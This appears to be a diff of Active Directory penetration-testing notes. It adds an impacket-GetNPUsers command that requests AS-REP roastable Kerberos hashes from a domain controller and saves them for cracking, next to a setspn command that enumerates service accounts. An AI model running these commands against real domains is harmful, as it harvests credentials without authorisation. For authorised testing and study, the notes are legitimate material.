@@ -1,3 +1,7 @@
 # We can obtain the IP address and port number of applications running on servers integrated with AD enumerating all SPNs in the domain without port scan. Setspn.exe, which is installed on Windows by default.
 
+
+impacket-GetNPUsers -dc-ip 10.0.0.2 -request -outputfile hashes.asreproast superalex.sec/user01
+
+
 setspn -L iis_service
